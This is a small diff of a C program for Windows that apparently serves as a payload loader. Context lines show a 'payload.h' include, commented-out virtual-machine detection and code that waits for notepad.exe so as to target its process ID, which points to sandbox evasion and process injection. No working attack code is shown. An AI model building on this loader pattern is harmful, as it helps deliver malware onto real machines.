@@ -1,4 +1,3 @@
-#include <WinSock2.h>
 #include <Windows.h>
 #include <stdio.h>
 #include "payload.h"
@@ -126,8 +125,9 @@ int main()
     //     printf("[+] VM has not been detected! Operation continue!\n");
     //     #endif
     // }
+
     #ifdef DEBUG
-        printf("[*] waiting for notepad.exe\n");
+        printf("[*] Waiting for notepad.exe\n");
     #endif
 
     DWORD targetpid = 0;
